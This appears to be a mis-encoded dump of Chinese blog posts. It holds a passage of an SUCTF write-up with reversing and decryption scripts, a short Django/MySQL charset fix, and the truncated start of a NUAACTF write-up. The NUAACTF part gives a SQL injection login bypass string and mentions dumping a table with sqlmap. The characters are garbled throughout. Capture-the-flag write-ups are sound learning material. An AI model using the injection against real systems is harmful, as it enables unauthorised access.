æ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œæœ‰ flagâ€¦ è‚ å­æœæ‚”é’äº†ğŸ˜¢ Mobile æœ€åŸºç¡€çš„å®‰å“é€†å‘é¢˜æ–‡ä»¶åœ¨è¿™å„¿ã€‚å…ˆç”¨ dex2jar è§£å‡º jar åŒ…ï¼Œç„¶åç”¨ jd-gui åç¼–è¯‘ï¼Œæœ€åå‘ç° flag åœ¨ MainActivity é‡Œï¼šsuctf{Crack_Andr01d+50-3asy} Mob200æ–‡ä»¶ã€‚åç¼–è¯‘ä»¥åæ”¹ä»£ç ï¼ŒæŠŠåŠ å¯†è¿‡ç¨‹é€†è¿‡æ¥ï¼Œæ”¾åˆ°å®‰å“ç³»ç»Ÿé‡Œè·‘ä¸€ä¸‹å°±èƒ½å‡ºç»“æœã€‚ç„¶è€Œ Android Studio è·Ÿæˆ‘æœ‰ä»‡â€¦ å·¥ç¨‹è·‘ä¸èµ·æ¥ï¼Œç®—äº†ã€‚ mipsæ–‡ä»¶ã€‚æ‰¾äº†ä¸ªåœ¨çº¿åç¼–è¯‘çš„ç½‘ç«™ https://retdec.com/decompilation/ å»åç¼–è¯‘ï¼Œå¾—åˆ°ä»£ç ï¼š123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; char * g1 = \"\\x58\\x31\\x70\\x5c\\x35\\x76\\x59\\x69\\x38\\x7d\\x55\\x63\\x38\\x7f\\x6a\"; // 0x410aa0 int main(int argc, char ** argv) &#123; int32_t str = 0; // bp-52 int32_t str2 = 0; // bp-32 printf(\"Input Key:\"); scanf(\"%16s\", &amp;str); int32_t v1 = 0; // bp-56 if (strlen((char *)&amp;str) == 0) &#123; if (memcmp((char *)&amp;str2, (char *)&amp;g1, 16) == 0) &#123; printf(\"suctf&#123;%s&#125;\\r\\n\", &amp;str); &#125; else &#123; puts(\"please reverse me!\\r\"); &#125; return 0; &#125; int32_t v2 = 0; // 0x4008148 int32_t v3 = v2 + (int32_t)&amp;v1; // 0x4007c0 unsigned char v4 = *(char *)(v3 + 4); // 0x4007c4 *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2); v1++; while (v1 &lt; strlen((char *)&amp;str)) &#123; v2 = v1; v3 = v2 + (int32_t)&amp;v1; v4 = *(char *)(v3 + 4); *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2); v1++; &#125; if (memcmp((char *)&amp;str2, (char *)&amp;g1, 16) == 0) &#123; printf(\"suctf&#123;%s&#125;\\r\\n\", &amp;str); &#125; else &#123; puts(\"please reverse me!\\r\"); &#125; return 0;&#125;é‡Œé¢æœ‰å„ç§æŒ‡é’ˆæ“ä½œï¼Œä¸è¿‡ä¹Ÿä¸éº»çƒ¦ï¼Œå•ƒä¸€ä¸‹å°±å¥½å•¦ã€‚ç¼–å†™è§£å¯†ç¨‹åºï¼š12345678char g[] = \"\\x58\\x31\\x70\\x5c\\x35\\x76\\x59\\x69\\x38\\x7d\\x55\\x63\\x38\\x7f\\x6a\"; int main() &#123; for (int i = 0; i &lt; strlen(g); i++) &#123; printf(\"%c\", g[i] ^ i); &#125; printf(\"\\n\");&#125;å¾—åˆ° flag: suctf{X0r_1s_n0t_h4rd}.ä¸€å¼€å§‹åœ¨æƒ³ï¼Œä¸ºå•¥ mips è¦æ”¾åœ¨ Mobile é‡Œï¼Ÿåæ¥æƒ³åˆ°æœ‰äº›è·¯ç”±å™¨æ˜¯ mips æ¶æ„çš„ï¼Œæ²¡æ¯›ç—…ã€‚ Mob300æ–‡ä»¶ã€‚è§£å‹ apkï¼Œèƒ½çœ‹åˆ°é‡Œé¢çš„åŠ¨æ€é“¾æ¥åº“ã€‚éšä¾¿æ‰¾äº†ä¸ª x86 çš„ï¼Œåç¼–è¯‘å‡ºæ¥ï¼Œåœ¨é‡Œé¢æ‰¾å„ç§å¸¸é‡ï¼Œæœ€åæ‰¾åˆ°äº†å‡ æ®µå­—ç¬¦ä¸²æ‹¼èµ·æ¥çš„ flag: suctf{Meet_jni_50_fun}.è¿™ä¸ªé¢˜ä¹Ÿåƒæ˜¯é€†å‘â€¦ Misc ç­¾åˆ°Misc çš„é¢˜æœ€å¥½ç©å•¦ã€‚é¢˜ç›®ä¸Šç»™äº†ä¸ª QQ ç¾¤ï¼ŒåŠ è¿›å»ï¼Œç¾¤æ–‡ä»¶é‡Œæœ‰ flag.txt.suctf{Welc0me_t0_suCTF} Misc-50é¢˜ç›®ç»™äº†ä¸ª è¶…å¤§çš„ GIFï¼Œä¸€ä¸ªé•¿æ¡ï¼Œçœ‹äº†åŠå¤©æ²¡çœ‹å‡ºæ‰€ä»¥ç„¶æ¥ã€‚åæ¥æƒ³äº†æƒ³ï¼Œå¯èƒ½æ˜¯æ¯ä¸€å¸§æ‹¼èµ·æ¥èƒ½æåˆ° flagï¼Œäºæ˜¯å†™äº†ä¸ªç¨‹åºæ‹¼äº†ä¸€ä¸‹ã€‚1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import osfrom PIL import Image def analyseImage(path): ''' Pre-process pass over the image to determine the mode (full or additive). Necessary as assessing single frames isn't reliable. Need to know the mode before processing all frames. ''' im = Image.open(path) results = &#123; 'size': im.size, 'mode': 'full', &#125; try: while True: if im.tile: tile = im.tile[0] update_region = tile[1] update_region_dimensions = update_region[2:] if update_region_dimensions != im.size: results['mode'] = 'partial' break im.seek(im.tell() + 1) except EOFError: pass return results def processImage(path): ''' Iterate the GIF, extracting each frame. ''' final_img = Image.new('RGBA', (7*71, 750)) mode = analyseImage(path)['mode'] im = Image.open(path) i = 0 p = im.getpalette() last_frame = im.convert('RGBA') try: while True: if not im.getpalette(): im.putpalette(p) new_frame = Image.new('RGBA', im.size) if mode == 'partial': new_frame.paste(last_frame) new_frame.paste(im, (0,0), im.convert('RGBA')) final_img.paste(new_frame, (7*i, 0)) i += 1 last_frame = new_frame im.seek(im.tell() + 1) except EOFError: pass return final_img def main(): final_img = processImage('Misc-50.gif') final_img.save(\"Misc-50-final.png\") if __name__ == \"__main__\": main()å‡ºæ¥ä¸€å¼ å›¾ç‰‡ï¼Œé‡Œé¢æœ‰ flag: suctf{t6cV165qUpEnZVY8rX} Forensic-100ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶, file ä¸€ä¸‹å‘ç°æ˜¯ gzip å‹ç¼©è¿‡çš„ã€‚æƒ³ç”¨ gzip -d SU è§£å‹ï¼Œç„¶è€ŒæŠ¥äº†ä¸€ä¸ª gzip: SU: unknown suffix -- ignored.é‡å‘½åä¸º SU.gzï¼Œç„¶åè§£å‹ï¼Œå¾—åˆ°ä¸€ä¸ª rot13 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚è§£å¯†ä¸€ä¸‹ï¼š12codecs.encode('fhpgs&#123;CP9PuHsGx#&#125;', 'rot13')'suctf&#123;PC9ChUfTk#&#125;'å…³äº gzip è§£å‹çš„é—®é¢˜ï¼Œè¿˜æœ‰ä¸¤ç§æ–¹æ³•ï¼šgunzip -d SUï¼Œgunzip ä¸ä¼šç®¡æ–‡ä»¶åï¼Œç›´æ¥è§£å‹åæŠŠå†…å®¹æ‰”åˆ° stdout ä¸Šã€‚cat SU | gzip -d, ç”¨ç®¡é“æŠŠ SU çš„ å†…å®¹è¾“å‡ºæ¥ã€‚å°æ’æ›²ï¼šä¸Šé¢é‚£ä¸ª rot13 çš„å­—ç¬¦ä¸²é‡Œæœ‰ä¸ªäº•å·ï¼Œä¼šè§¦å‘ hexo çš„ä¸€ä¸ªè°œä¹‹ bugâ€¦è›‹ç–¼ã€‚ è¿™ä¸æ˜¯å®¢æœçš„å¤´åƒå˜›ã€‚ã€‚ã€‚ã€‚23333ä¸‹è½½å‡ºä¸€å¼ å›¾ç‰‡ï¼Œä¸€å¼  jpgï¼ŒEXIF çœ‹ä¸å‡ºåå ‚ï¼Œstegsolve ä¹Ÿçœ‹ä¸å‡ºæ¥é—®é¢˜ã€‚binwalk ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œç„¶åç”¨ dd æå‡ºæ¥ï¼š12345678910$ binwalk xu.jpg DECIMAL HEX DESCRIPTION-------------------------------------------------------------------------------------------------------46046 0xB3DE RAR archive data $ dd if=xu.jpg of=xu.rar bs=1 skip=4604620221+0 records in20221+0 records out20221 bytes (20 kB) copied, 0.294344 s, 68.7 kB/sæå‡ºæ¥è§£å‹ï¼Œå¾—åˆ°ä¸€ä¸ª img é•œåƒï¼ŒæŒ‚è½½ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰å››å¼ å›¾ç‰‡ï¼Œæ‹¼èµ·æ¥æ˜¯ä¸ªäºŒç»´ç ï¼Œæ‰«ä¸€æ‰«å¾—åˆ° flag: suctf{bOQXxNoceB} Forensic-250Can you fix it?Fix the file in the rarTips:Audioæ–‡ä»¶ã€‚è§£å‹å‡ºæ¥ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼š1ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 74 14 45 50 d8 e3 f9 07 bf c7 â€¦çœŸæ˜¯ä¸§å¿ƒç—…ç‹‚ï¼ŒæŠŠå­—èŠ‚æ‹†å‡ºæ¥å†™åˆ°æ–‡æœ¬æ–‡ä»¶é‡ŒğŸ˜‚ å†™ä¸ªç¨‹åºè½¬ä¸€ä¸‹ã€‚è½¬å‡ºæ¥å°±ä¸çŸ¥é“å¹²ä»€ä¹ˆäº†â€¦ æ„Ÿè§‰æ˜¯ä¸ªæ–‡ä»¶å¤´ï¼Œä½†æ˜¯ä½ è¿™ä¸ªæ–‡ä»¶å¤´å…¨è¢« 00 åˆ·æ‰äº†ï¼Ÿè¿™å°¼ç›æ€ä¹ˆä¿®ğŸŒšç„¶åçº¿ç´¢å°±æ–­äº†ã€‚ Re å…ˆåˆ©å…¶å™¨ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ã€‚æ‹–è¿› IDAï¼Œæ‰¾åˆ°ä¸¤æ®µä»£ç ï¼š123456789101112131415161718192021// ...if ( num &gt; 9 ) &#123; plaintext = 'I'; flag(&amp;plaintext);&#125;// ... signed int __cdecl flag(int *ret) &#123; ret[12] = 'a'; ret[11] = '6'; ret[10] = 'I'; ret[9] = '_'; ret[8] = 'e'; ret[7] = '5'; ret[6] = 'U'; ret[5] = '_'; ret[4] = 'n'; ret[3] = '@'; ret[2] = 'c'; return 1;&#125;ç„¶åæ‹¼èµ·æ¥ï¼Œflag é‡Œè¿˜å·®ä¸ªä¸‹åˆ’çº¿ï¼Œæ²¡çœ‹ä»£ç ï¼ŒçŒœå‡ºæ¥äº†ï¼šsuctf{I_c@n_U5e_I6a} PE_Formatæ–‡ä»¶ã€‚ä¸æ‡‚ PE æ ¼å¼ï¼Œä¸‹ä¸‹æ¥ä»¥åçœ‹äº†åŠå¤©ã€‚åæ¥å‘ç°å‡ºé¢˜äººç«Ÿç„¶æŠŠ MZ å¤´å’Œ PE å¤´é‡Œçš„ MZ å’Œ PE ç»™è°ƒè¿‡æ¥äº†ğŸ˜‚ æ”¹æ­£åï¼ŒæŠŠ MZ å¤´ä¸­ PE å¤´çš„ä½ç½®ä» 0x40 æ”¹åˆ° 0x80, ç¨‹åºå°±èƒ½è·‘èµ·æ¥äº†ã€‚æ‹–åˆ° IDA é‡Œåç¼–è¯‘ï¼Œç¨‹åºç«Ÿç„¶æ˜¯ç”¨ Cè‰¹ å†™çš„â€¦å•ƒä»£ç å•ƒä»£ç ï¼Œæœ€åå‘ç° flag è¢«æŒ‰ä½éäº†ï¼Œå†™ä¸ªç¨‹åºè§£å‡ºæ¥ï¼š12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt; // char secret[] = \"Â»Â Â¦ÂÅ  â€â€˜ÂË† Â¯Âº Â¹ÂÂâ€™Å¾â€¹Ã€\";char secret[] = \"\\xBB\\x90\\xA0\\xA6\\x90\\x8A\\xA0\\x94\\x91\\x90\\x88\\xA0\\xAF\\xBA\\xA0\\xB9\\x90\\x8D\\x92\\x9E\\x8B\\xC0\";char v35[40]; int main()&#123; char c; int len = strlen(secret); memset(v35, 0, 30); strcpy(v35, secret); for (int i = 0; i &lt; len; i++) v35[i] = ~v35[i]; printf(\"%s\\n\", v35); return 0;&#125;å¾—åˆ° flag: suctf{Do_You_know_PE_Format?}. Find_correct_pathæ–‡ä»¶ã€‚çœ‹æºç ï¼š1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax@2 char s; // [sp+Ch] [bp-2Ch]@1 char v5; // [sp+20h] [bp-18h]@1 int v6; // [sp+28h] [bp-10h]@11 int v7; // [sp+2Ch] [bp-Ch]@1 v7 = 0; memset(&amp;s, 0, 0x14u); __isoc99_scanf((const char *)&amp;unk_8048D40, &amp;v5); if ( v7 ) &#123; switch ( v7 ) &#123; case 1: choose1((int)&amp;s); break; case 2: choose2((int)&amp;s); break; case 3: choose3((int)&amp;s); break; case 4: choose4((int)&amp;s); break; &#125; v6 = strlen(&amp;s); final((int)&amp;s, v6); result = 0; &#125; else &#123; result = 1; &#125; return result;&#125;å‘ç°ç¨‹åºè¯»å…¥ v5 çš„å€¼ï¼Œåé¢å´åˆ¤æ–­äº† v7. æ‰”åˆ° Linux ä¸‹åŠ¨æ€è°ƒè¯•ã€‚ä¸€å¼€å§‹è€æ˜¯æŠ¥ â€œNo such file or directoryâ€, åæ¥å‘ç°æ²¡æœ‰ libc6 é“¾æ¥åº“ã€‚ç„¶åç”¨ gdbï¼Œåœ¨ v7 èµ‹å€¼åä¸‹æ–­ç‚¹ï¼Œæ”¹æ‰ v7 çš„å€¼ï¼Œç„¶åè®©ç¨‹åºç»§ç»­è¿è¡Œã€‚æœ€åå¾—åˆ° flag: suctf{Thl5_way_ls_r!8ht}.çœ‹å°ä¼™ä¼´çš„ Writeup æ—¶ï¼Œå‘ç° IDA åç¼–è¯‘å‡ºçš„æºç æ˜¯å¯ä»¥åœ¨ Linux ä¸­ç¼–è¯‘çš„ï¼Œä»–ç›´æ¥æŠŠæºç é‡Œçš„ v5 æ”¹æˆ v7ï¼Œç„¶åç¼–è¯‘ä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚ç¥å¥‡ğŸ˜³ reverse04æ–‡ä»¶ã€‚å°¼ç›ï¼Œä¸ºå•¥é¢˜ç›®æ˜¯ 04ï¼Œæ–‡ä»¶æ˜¯ 03â€¦ç¨‹åºé‡Œç”¨äº†å„ç§ååŠ¨æ€è°ƒè¯•æŠ€æœ¯ï¼Œäºæ˜¯æˆ‘å°±é™æ€åˆ†æäº†ï¼Œåæ­£ä¹Ÿä¸ä¼šã€‚ç»“æœåˆ†æäº†åŠå¤©ï¼Œå„ç§ç®—åœ°å€ï¼Œæœ€åç®—å‡ºæ¥çš„ flag éƒ½æœ‰é—®é¢˜ï¼Œå°±æ”¾å¼ƒäº†â€¦æ®è¯´æˆ‘åªè·Ÿ flag å·®ä¸€ä¸ªå‡¯æ’’åŠ å¯†ï¼Ÿå™«ï¼Œé‚£å¤©çŠ¶æ€çœŸæ˜¯å·®ã€‚flag: suctf{antidebugabc}. Crypto base??MMZVM2TEI5NDOU2WHB4GEM22NRMDCTRRMZIT2PI= å…¨å¤§å†™ï¼Œæ ¹æ®é¢˜ç›®åˆ¤æ–­åº”è¯¥æ˜¯ base32. è§£å‡ºæ¥ä¸€æ®µ base64, å†è§£å¯†å¾—åˆ° flag: suctf{I_1ove_Su}. å‡¯æ’’å¤§å¸OK, å‡¯æ’’å¯†ç ï¼Œæš´åŠ›æšä¸¾ä¸€ä¸‹ï¼Œæœ€åå‘ç°æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²æ‹¼èµ·æ¥ï¼Œèƒ½å¾—åˆ° suctf{I_am_Cathar}.ç„¶åè›‹ç–¼çš„åœ°æ–¹å°±æ¥äº†ã€‚é¼“æ£äº†ä¸€æ™šä¸Šï¼Œkey å„ç§é”™ï¼Œåæ¥åŒå­¦å‘Šè¯‰æˆ‘è¯´ï¼Œkey æ˜¯ Caesarâ€¦ ç‰¹ä¹ˆç«Ÿç„¶æ˜¯æ•…æ„å†™é”™çš„ï¼Ÿ_(:Ğ·ã‚âˆ )_ easyRSAæ–‡ä»¶è§£å‡ºæ¥æ˜¯ RSA çš„å…¬é’¥å’ŒåŠ å¯†å†…å®¹ã€‚æ‰¾äº†ä¸ª Writeupï¼Œç…§ç€åšï¼Œåˆ†è§£è´¨å› æ•°ç”¨ yafu æå®šï¼Œæœ€åå¾—åˆ° flag: suctf{Rsa_1s_ea5y}. æ™®è±è´¹å°”C:prewglqkobbmxgkyzmvymlWW91IGFyZSBsdWNreQ==Playfair å¯†ç ã€‚å¯†é’¥æ˜¯åé¢é‚£ä¸ª base64 è§£å‡ºæ¥çš„ã€‚ç„¶è€Œï¼ŒPlayfair çš„åŠ å¯†çŸ©é˜µæ„é€ æ–¹å¼å¥½åƒæœ‰å¥½å¤šç§ï¼Œæ‰€ä»¥æ‰¾äº†å¥½å‡ ä¸ªåœ¨çº¿è§£å¯†ç½‘ç«™ï¼Œæœ€åæ‰¾åˆ° è¿™ä¸ªï¼ŒæŠŠ flag è§£å‡ºæ¥äº†ï¼šsuctf{charleswheatstone} æ€»ç»“ï¼ˆè¯´ç‚¹é—²è¯ï¼‰è¿™æ¬¡ CTF æ˜¯ä¸ªäººèµ›ï¼Œä¸ºæœŸä¸€å‘¨ï¼Œå¾ˆå¤šé¢˜éƒ½æ˜¯åœ¨å·¥ä½œæ—¥ä¸‹ç­ä¹‹åå®Œæˆçš„ï¼Œæ‰€ä»¥åšé¢˜çš„æ—¶å€™è€å¿ƒå°‘äº†ä¸€ç‚¹ï¼Œå¾ˆå¤šé¢˜åŠå¤©æ²¡åšå‡ºæ¥å°±æ”¾å¼ƒäº†ï¼ˆæ¯”å¦‚ Android Studio é‚£é“é¢˜ï¼‰ã€‚åšå®¢åˆå¾ˆä¹…æ²¡æ›´æ–°äº†ï¼Œä¸ƒæœˆåˆ°åä¸€æœˆåœ¨å®ä¹ ï¼Œæ¯å¤©æ²‰è¿·å·¥(yu)ä½œ(le)ï¼Œæ²¡æœ‰ä»€ä¹ˆå¿ƒæ€å»å­¦ä¹ ã€å»æé«˜ã€‚ç°åœ¨å®ä¹ ç»“æŸäº†ï¼Œå´æ¬ äº†ä¸€å †ä½œä¸šæ²¡åšã€‚ç­‰æˆ‘æŠŠä½œä¸šéƒ½åšå®Œï¼Œå†æ¥æ›´æ–°å§ã€‚å¤§æ¦‚ä¼šå†™ä¸€ç¯‡ Django REST Framework çš„å…¥é—¨æŒ‡å—ï¼ŸğŸ˜³","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.stdioa.com/tags/CTF/"},{"name":"è„‘æ´","slug":"è„‘æ´","permalink":"https://blog.stdioa.com/tags/è„‘æ´/"}]},{"title":"è§£å†³ MySQL ç¼–ç é—®é¢˜","slug":"django-mysql-charset-problem","date":"2016-05-09T01:40:46.000Z","updated":"2018-07-12T00:15:08.365Z","comments":true,"path":"2016/05/django-mysql-charset-problem/","link":"","permalink":"https://blog.stdioa.com/2016/05/django-mysql-charset-problem/","excerpt":"å¾ˆä¹…ä»¥å‰å†™äº†ä¸€ä¸ª Django é¡¹ç›®ï¼Œæ•°æ®åº“ç”¨çš„ MySQL. å¾ˆä¹…æ²¡ç”¨ï¼Œåæ¥å‘ç° MySQL ç¼–ç è®¾ç½®æœ‰é—®é¢˜ï¼Œå¯¼è‡´ä¸­æ–‡å…¨éƒ¨å˜æˆäº†é—®å·ã€‚","text":"å¾ˆä¹…ä»¥å‰å†™äº†ä¸€ä¸ª Django é¡¹ç›®ï¼Œæ•°æ®åº“ç”¨çš„ MySQL. å¾ˆä¹…æ²¡ç”¨ï¼Œåæ¥å‘ç° MySQL ç¼–ç è®¾ç½®æœ‰é—®é¢˜ï¼Œå¯¼è‡´ä¸­æ–‡å…¨éƒ¨å˜æˆäº†é—®å·ã€‚ 1. è®¾ç½® MySQL æœåŠ¡ç«¯é»˜è®¤å­—ç¬¦é›†åœ¨ my.cnf ä¸­è®¾ç½®é»˜è®¤å­—ç¬¦é›†ï¼š12[mysqld]character-set-server=utf8åŒæ—¶ï¼Œå¯ä»¥è®¾ç½® MySQL å®¢æˆ·ç«¯çš„é»˜è®¤å­—ç¬¦é›†ï¼š12[mysql]character-set-default=utf-8é…ç½®å®Œæˆåï¼Œé‡å¯ MySQL æœåŠ¡ï¼Œè¾“å…¥ SHOW VARIABLES LIKE '%CHAR'; æ£€æŸ¥å­—ç¬¦é›†æ˜¯å¦æ­£ç¡®ã€‚ 2. æ‰‹åŠ¨è®¾ç½®æ•°æ®åº“ç¼–ç ä¿®æ”¹é»˜è®¤ç¼–ç å…¶å®æ˜¯æ²¡ç”¨çš„ğŸ˜‚ï¼Œè¿˜éœ€è¦æ‰‹åŠ¨è®¾ç½®æ•°æ®åº“ç¼–ç ï¼Œè€Œæ•°æ®åº“ç¼–ç éœ€è¦åœ¨å»ºç«‹æ—¶æŒ‡å®šï¼Œæ‰€ä»¥â€¦çœŸæ˜¯ä¸€ä¸ªæ‚²ä¼¤çš„æ•…äº‹ğŸ˜¢ï¼ˆåæ­£æˆ‘çš„æœåŠ¡ä¹Ÿæ²¡äººç”¨é‡æ–°å»ºç«‹æ•°æ®åº“ï¼š12DROP DATABASE spaste;CREATE DATABASE spaste DEFAULT CHARACTER SET utf8;é‡å»ºæ•°æ®åº“åï¼Œè¾“å…¥ python manager.py migrate é‡æ–°è¿ç§»æ•°æ®åº“ã€‚ 3. å‚è€ƒèµ„æ–™Configuring the Character Set and Collation for Applications - MySQL 5.7 Reference Manualdjango è§£å†³ mysql æ•°æ®åº“è¾“å…¥ä¸­æ–‡ä¹±ç é—®é¢˜ 4. åè®°å¥½çŸ­çš„ä¸€ç¯‡æ–‡ç« â€¦æœ€è¿‘åœ¨çˆ¬ B ç«™ç”¨æˆ·çš„å…¬å¼€ç”¨æˆ·æ•°æ®ï¼Œæ•°æ®åº“ç”¨äº† MongoDB, çˆ¬å®Œä»¥åå¥½å¥½ç©ä¸€ç©ğŸ˜³B ç«™åŸºä½¬å¥½å¤šå•Š_(:Ğ·ã‚âˆ )_","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://blog.stdioa.com/categories/å¼€å‘/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://blog.stdioa.com/tags/Django/"},{"name":"MySQL","slug":"MySQL","permalink":"https://blog.stdioa.com/tags/MySQL/"}]},{"title":"ç¬¬ä¸€å±Š NUAACTF éå®˜æ–¹ Writeup","slug":"nuaactf-unofficial-writeup","date":"2016-04-25T04:01:04.000Z","updated":"2018-07-12T00:14:40.164Z","comments":true,"path":"2016/04/nuaactf-unofficial-writeup/","link":"","permalink":"https://blog.stdioa.com/2016/04/nuaactf-unofficial-writeup/","excerpt":"å­¦æ ¡ç»„ç»‡äº†ç¬¬ä¸€å±Š NUAACTFï¼Œå‚åŠ å»ç©ç©ï¼Œå¼€å¼€è„‘æ´ğŸ˜‚ï¼Œå—¯ï¼Œè¿˜è›®å¥½ç©çš„~","text":"å­¦æ ¡ç»„ç»‡äº†ç¬¬ä¸€å±Š NUAACTFï¼Œå‚åŠ å»ç©ç©ï¼Œå¼€å¼€è„‘æ´ğŸ˜‚ï¼Œå—¯ï¼Œè¿˜è›®å¥½ç©çš„~ Web 0huanâ€™yingâ€™laiâ€™daoç­¾åˆ°é¢˜ï¼ŒF12 å³å¯å¾—åˆ° flag.Flag è—åœ¨é¡µé¢çš„æŸä¸ª js æ–‡ä»¶é‡Œï¼Œç”¨ jsfuck æ··æ·†äº†ã€‚ Web 1ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“é¢˜ç›®è²Œä¼¼æ”¹è¿‡ä¸€å›ã€‚æ”¹ä¹‹å‰ç›´æ¥ç‚¹å‡»ç½‘é¡µä¸Šçš„ä¸€ä¸ªé“¾æ¥ï¼Œè·³è½¬åˆ°æŸä¸ªç½‘é¡µï¼Œæºä»£ç é‡Œé¢æœ‰ä¸€æ®µ phpï¼Œå…·ä½“å†…å®¹ä¸è®°å¾—äº†ï¼Œé‡Œé¢æœ‰ä¸€ä¸² MD5 095a655fc809cbbdffa207717a5233f5. Google ä¸€ä¸‹æ‰¾åˆ°æŸç™½èœçš„åšå®¢ï¼Œå¾—åˆ°åŸæ–‡ bnVhYWN0ZiU3Qi93ZWIyL2NlYmE2ZmJiZjBlZGU0MzI1MjY0MWNkMzM2ZTM2YTAzJTdE.çœ‹èµ·æ¥åƒ Base64ï¼Œäºæ˜¯ decode ä¸€ä¸‹ï¼Œç„¶å decodeURIComponents å¾—åˆ° flag.åæ¥é¢˜ç›®æ”¹äº†ï¼Œç›´æ¥æŒ‰ç…§é¢˜ç›®è¦æ±‚å»ç™¾åº¦å°±èƒ½ç›´æ¥æ‰¾åˆ°æŸç™½èœçš„åšå®¢ã€‚ Web 2ä¸æ˜¯ bug æ˜¯ featureWeb 2 çš„å…¥å£ç‚¹åœ¨ Web 1 çš„ flag é‡Œã€‚è¿›å»ä»¥åä¼šè·³è½¬åˆ°æŸä¸ª php, ç„¶è€ŒæŸç™½èœåˆæŠŠ php æºç å†™è¿›å»äº†ï¼Œæ€è·¯è·Ÿä¸Šä¸ªé¢˜å¥½åƒä¸€æ ·ï¼Œä¹Ÿæ˜¯å»ç™¾åº¦ä¸€ä¸‹ MD5 å¾—åˆ°å¯†ç ï¼Œæ·»åŠ  GET å‚æ•°å³å¯æ‹¿åˆ° flag. Web 3ç¬¨ç¬¨çš„ç¨‹åºçŒ¿Web 3 çš„å…¥å£ç‚¹åœ¨ Web 2 çš„ flag é‡Œã€‚è¿›å»ä»¥åè·³è½¬åˆ°æŸ php, é‡Œé¢åªæœ‰ä¸€ä¸ªç™»å½•è¡¨å•ã€‚çœ‹èµ·æ¥åƒæ˜¯ SQL æ³¨å…¥ï¼Œå°±ç”¨ sqlmap æ‰«äº†ä¸€ä¸‹ï¼ŒæŠŠè¡¨ dump å‡ºæ¥ï¼Œå‘ç°æœ‰ä¸¤ä¸ªè´¦æˆ· admin å’Œ userï¼Œå¯†ç éƒ½æ˜¯ä¸€å¨çœ‹èµ·æ¥ä»€ä¹ˆéƒ½ä¸åƒçš„ä¸œè¥¿ï¼Œç„¶åçº¿ç´¢å°±æ–­äº†ã€‚æœ€åä¸€ä¸ªå°æ—¶å†³å®šæ‰‹åŠ¨æ³¨å…¥ä¸€ä¸‹ï¼Œç„¶è€Œå¹¶ä¸æ€ä¹ˆä¼š SQL æ³¨å…¥äºæ˜¯å°±æ‰¾äº†å‡ ç¯‡åšå®¢æ¥çœ‹ã€‚æ³¨å…¥äº†åŠå¤©å¯†ç æ¡†å‡æ— æœï¼Œæœ€åè¯•äº†ä¸€ä¸‹æ³¨å…¥ç”¨æˆ·åè¾“å…¥æ¡† admin' or '1'='1ï¼ŒæˆåŠŸç™»å½•ã€‚ç™»å½•ä»¥å flag ä¸€é—ªè€Œè¿‡ï¼Œæœ¬æ¥æƒ³æˆªå±ç„¶è€Œæ‡’å¾—æˆªäº†å°±æŠ“äº†åŒ…ï¼Œæ‹¿åˆ° flag. Web 4 (æœªè§£å‡º)ä½ ä»å“ªé‡Œæ¥ï¼Œæˆ‘çš„æœ‹å‹ã€‚Web 3 æˆåŠŸç™»å½•åå°±è·³è½¬åˆ° Web 4ï¼Œç½‘é¡µå†™ç€&quot;0nly welc0me pe0ple who c0me from http://cs.nuaa.edu.cn &quot;ã€‚ç»“åˆâ€œä½ ä»å“ªé‡Œæ¥â€ï¼Œæƒ³åˆ°äº†è¯·æ±‚æ¥æºï¼Œä½†æ˜¯æˆ‘åªæƒ³åˆ°äº† Referer, ä¿®æ”¹åæ— æœã€‚æ¯”èµ›ç»“æŸåå¬è¯´è¦æ”¹ Origin å’Œ X-Forwarded-For, ç„¶è€Œæ”¹äº†ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œä¸çŸ¥é“å“ªé‡Œå‡ºäº†é—®é¢˜ã€‚ Rev 1æ›¾è€å¸ˆçš„ Android è¯¾æŠŠ apk ä¸‹è½½ä¸‹æ¥ï¼Œç”¨ jd-gui æ‰“å¼€ï¼Œä¸€é˜µä¹±ç¿»ä»¥åå‘ç° flag è—åœ¨ MainActivity.class é‡Œã€‚ Rev 2 (æœªè§£å‡º)å¥‡å¦™çš„å£°éŸ³åˆçœ‹è§å®‰å“äº†ï¼Œä¸‹ä¸‹æ¥ä»¥åä¸€é˜µä¹±ç¿»ï¼Œæ²¡æœ‰å¤´ç»ªã€‚åˆšæ‰çœ‹äº†åˆ«äººçš„é¢˜è§£ï¼Œå‘ç° flag åœ¨èµ„æºç›®å½•é‡Œé¢ã€‚æ‹¿å‡ºæ¥ res/raw/sound.wav, 